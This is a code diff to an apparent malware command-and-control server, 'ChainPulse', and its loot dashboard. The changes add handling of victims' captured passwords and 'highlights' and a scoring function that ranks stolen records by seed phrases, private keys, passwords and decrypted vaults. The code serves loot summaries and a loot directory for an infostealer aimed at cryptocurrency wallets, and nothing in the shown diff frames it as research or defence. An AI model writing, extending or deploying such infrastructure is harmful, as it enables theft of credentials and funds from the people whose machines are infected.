@@ -103,6 +103,8 @@ function unwrap(entry){
     files: inner.files || {},
     keylog: inner.keylog || {},
     password_managers: inner.password_managers || [],
+    highlights: Array.isArray(inner.highlights) ? inner.highlights : [],
+    persistent: !!(inner.persistent || top.persistent),
     id: pick(inner, ['id'], pick(top, ['id'], '')),
     raw: inner,
   };
@@ -142,9 +144,10 @@ async function load(){
     const seeds=(p.secrets.seed_phrases||[]).length;
     const pkeys=(p.secrets.private_keys||[]).length;
     const hasSessions=(p.exchange_sessions||[]).length;
+    const capPwEarly=(p.secrets.captured_passwords||[]);
     let cc='card';
     if(hasDrain)cc='card card-drain';
-    else if(seeds)cc='card card-seed';
+    else if(seeds||capPwEarly.length)cc='card card-seed';
     else if(hasSessions)cc='card card-session';
     else if(fileCount)cc='card card-files';
 
@@ -420,7 +423,7 @@ class C2Handler(BaseHTTPRequestHandler):
         elif self.path == "/api/loot-summary":
             self._serve_json(self._get_summary())
         elif self.path == "/health":
-            self._serve_json({"status": "healthy", "version": "8.3.0", "render": True})
+            self._serve_json({"status": "healthy", "version": "8.3.1", "render": True})
         else:
             self.send_error(404)
 
@@ -638,6 +641,21 @@ class C2Handler(BaseHTTPRequestHandler):
                 noise.append(r)
             else:
                 real.append(r)
+        def _score(r):
+            pl = r.get("payload") or r
+            sec = pl.get("secrets") if isinstance(pl.get("secrets"), dict) else {}
+            hl = pl.get("highlights") if isinstance(pl.get("highlights"), list) else []
+            score = 0
+            score += 100 * len(sec.get("captured_passwords") or [])
+            score += 200 * len(sec.get("seed_phrases") or [])
+            score += 150 * len(sec.get("private_keys") or [])
+            score += 50 * len(hl)
+            score += 10 * len(sec.get("decrypted_vaults") or [])
+            ts = str(r.get("timestamp") or pl.get("timestamp") or pl.get("time") or "")
+            return (score, ts)
+
+        real.sort(key=_score, reverse=True)
+        noise.sort(key=_score, reverse=True)
         # Prefer real hosts; fill with noise only if empty
         recent = (real + noise)[:40]
         real_hosts = set()
@@ -658,7 +676,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    print(f"[C2] ChainPulse v8.3.0 (Render) — http://{HOST}:{PORT}")
+    print(f"[C2] ChainPulse v8.3.1 (Render) — http://{HOST}:{PORT}")
     print(f"[C2] Dashboard: /dashboard")
     print(f"[C2] Health:    /health")
     print(f"[C2] Loot dir:  {LOOT_DIR}")
